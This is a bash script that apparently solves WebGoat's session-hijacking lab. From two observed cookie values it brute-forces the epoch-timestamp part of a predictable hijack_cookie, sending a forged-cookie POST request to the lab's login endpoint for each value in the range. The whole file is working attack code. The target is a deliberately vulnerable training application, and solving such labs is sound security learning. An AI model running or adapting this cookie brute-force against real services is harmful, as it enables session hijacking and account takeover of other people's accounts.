#!/bin/bash

# Request 1
# HTTP/1.1 200 OK
# Set-Cookie: hijack_cookie=4188217508945570979-1737115225288; path=/WebGoat; secure

# Request 2
# HTTP/1.1 200 OK
# Set-Cookie: hijack_cookie=4188217508945570981-1737115231450; path=/WebGoat; secure

# Brute forcing the epoch timestamps
for i in $(seq 1737115225288 1737115231450); do
curl --path-as-is -i -s -k -X $'POST' \
    -H $'Host: default.webgoat.ai.com:9000' -H $'Content-Length: 29' -H $'X-Requested-With: XMLHttpRequest' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36' -H $'Accept: */*' -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H $'Origin: http://default.webgoat.ai.com:9000' -H $'Referer: http://default.webgoat.ai.com:9000/WebGoat/start.mvc?username=helena' -H $'Accept-Encoding: gzip, deflate, br' -H $'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' -H $'Connection: keep-alive' \
    -b $"hijack_cookie=4188217508945569257-"$i"; JSESSIONID=[REDACTED]" \
    --data-binary $'username=admin&password=admin' \
    $'http://default.webgoat.ai.com:9000/WebGoat/HijackSession/login'
done
